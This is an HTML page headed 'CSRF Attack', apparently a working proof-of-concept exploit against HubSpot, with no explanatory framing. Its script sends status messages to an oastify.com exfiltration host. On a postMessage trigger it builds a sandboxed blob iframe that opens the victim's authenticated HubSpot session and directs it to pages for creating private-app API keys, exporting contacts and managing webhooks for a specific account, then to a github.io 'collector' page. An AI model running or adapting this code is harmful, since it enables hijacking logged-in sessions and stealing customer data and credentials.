<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>CSRF Attack</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        const blob = new Blob([`
<html>
<body>
<h2>CSRF Execution</h2>
<div id="log"></div>
<script>
const E = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';

function l(m) { 
    document.getElementById('log').innerHTML += '<br>' + m;
    // Can't exfil from blob, so just log
}

l('START');

// Open authenticated HubSpot window
let hub = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');

if (hub) {
    l('opened');
    
    setTimeout(() => {
        // Try different CSRF attacks in sequence
        
        // Attack 1: Try to create an API key
        l('attempt_1_create_api_key');
        hub.location = 'https://app-eu1.hubspot.com/integrations-settings/146256700/installed/private-apps/new';
        
        setTimeout(() => {
            // Attack 2: Export contacts
            l('attempt_2_export_contacts');
            hub.location = 'https://app-eu1.hubspot.com/contacts/146256700/objects/0-1/views/all/list?export=true';
            
            setTimeout(() => {
                // Attack 3: Navigate to webhook creation
                l('attempt_3_webhooks');
                hub.location = 'https://app-eu1.hubspot.com/webhooks-dashboard/146256700';
                
                setTimeout(() => {
                    // Final: Navigate to our collector
                    l('navigating_to_collector');
                    hub.location = 'https://majdch22.github.io/collector.html';
                }, 3000);
                
            }, 3000);
        }, 3000);
        
    }, 2000);
}
<\/script>
</body>
</html>
        `], {type: 'text/html'});
        
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        iframe.src = blobUrl;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('iframe_added');
    }
});

if(window.opener) {
    window.opener.postMessage({status:'ready'},'*');
}
</script>
</body>
</html>
